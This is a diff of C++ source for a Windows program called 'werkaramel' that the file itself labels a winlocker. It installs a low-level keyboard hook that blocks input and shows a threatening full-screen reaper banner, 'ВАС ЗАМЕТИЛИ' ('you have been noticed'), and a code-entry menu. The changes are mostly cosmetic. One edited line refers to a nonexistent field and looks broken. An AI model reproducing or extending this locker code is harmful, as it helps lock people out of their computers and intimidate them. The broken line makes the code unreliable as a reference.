@@ -1,5 +1,5 @@
 // language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
-// werkaramel — reaper + rules + menu + winlocker
+// werkaramel — Death + rules + menu + winlocker with reaper
 #include <windows.h>
 #include <string>
 #include <thread>
@@ -15,7 +15,19 @@ HWND g_hCon = nullptr;
 std::wstring g_input;
 std::mt19937 g_rng(std::random_device{}());
 
-// ── ТОТ САМЫЙ ЖНЕЦ ──────────────────────────────────────────
+// ── DEATH — для CMD 1 ───────────────────────────────────────
+const wchar_t* DEATH[] = {
+    L"888                888   888      ",
+    L"888                888   888      ",
+    L"888                888   888      ",
+    L" .d88888 .d88b.  8888b. 88888888888b.  ",
+    L"d88\" 888d8P  Y8b    \"88b888   888 \"88b ",
+    L"888  88888888888.d888888888   888  888 ",
+    L"Y88b 888Y8b.    888  888Y88b. 888  888 ",
+    L" \"Y88888 \"Y8888 \"Y888888 \"Y888888  888 ",
+};
+
+// ── ЖНЕЦ — для WinLocker ────────────────────────────────────
 const wchar_t* REAPER[] = {
     L"             ;::::;",
     L"           ;::::; :;",
@@ -84,8 +96,8 @@ BOOL WINAPI CtrlHandler(DWORD type) {
 void SetupConsole() {
     CONSOLE_FONT_INFOEX cfi{};
     cfi.cbSize = sizeof(cfi);
-    cfi.dwFontSize.Y = 12;
-    cfi.dwFontSize.X = 6;
+    cfi.dwFontSize.Y = 14;
+    cfi.dwFontSize.X = 7;
     wcscpy_s(cfi.FaceName, L"Consolas");
     SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);
 
@@ -122,14 +134,13 @@ LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
 }
 
 // ═══════════════════════════════════════════════════════════
-// ФАЗА 1 — ЖНЕЦ + ВАС ЗАМЕТИЛИ
+// ФАЗА 1 — DEATH + ВАС ЗАМЕТИЛИ
 // ═══════════════════════════════════════════════════════════
 void PhaseRed() {
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                  GetModuleHandleW(nullptr), 0);
 
     ClearScreen(0);
-
     SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
 
     CONSOLE_SCREEN_BUFFER_INFO csbi;
@@ -137,21 +148,21 @@ void PhaseRed() {
     int cols = csbi.srWindow.Right - csbi.srWindow.Left + 1;
     int rows = csbi.srWindow.Bottom - csbi.srWindow.Top + 1;
 
-    int reaper_lines = sizeof(REAPER) / sizeof(REAPER[0]);
-
-    int startY = (rows - reaper_lines - 4) / 2;
+    int lines = sizeof(DEATH) / sizeof(DEATH[0]);
+    int startY = (rows - lines - 4) / 2;
     if (startY < 1) startY = 1;
 
-    for (int i = 0; i < reaper_lines; ++i) {
-        int len = (int)wcslen(REAPER[i]);
+    for (int i = 0; i < lines; ++i) {
+        int len = (int)wcslen(DEATH[i]);
         int x = (cols - len) / 2;
         if (x < 1) x = 1;
         Gotoxy(x, startY + i);
-        WOut(REAPER[i]);
+        WOut(DEATH[i]);
     }
 
+    // ВАС ЗАМЕТИЛИ под Death
     std::wstring txt = L"В А С   З А М Е Т И Л И";
-    int txtY = startY + reaper_lines + 2;
+    int txtY = startY + lines + 2;
     if (txtY > rows - 1) txtY = rows - 1;
 
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
@@ -235,7 +246,7 @@ void PhaseMenu() {
             continue;
         }
         if (rec.EventType != KEY_EVENT || !rec.Event.KeyEvent.bKeyDown) continue;
-        wchar_t c = rec.Event.KeyEvent.uChar.UnicodeChar;
+        wchar_t c = rec.Event.EventType ? rec.Event.KeyEvent.uChar.UnicodeChar : 0;
         if (c == 0) continue;
 
         if (c >= L'0' && c <= L'9') { g_input += c; PrintMenu(); }
@@ -324,10 +335,8 @@ void WLPaint(HWND hwnd) {
 
     int sw = rc.right;
 
-    // жнец слева
     DrawReaperWL(dc, 60, 100);
 
-    // баннер справа
     int bx = sw / 2 + 60;
     DrawBigBanner(dc, bx, 100, L"WERKARAMEL", W_BLOOD, 60);
 
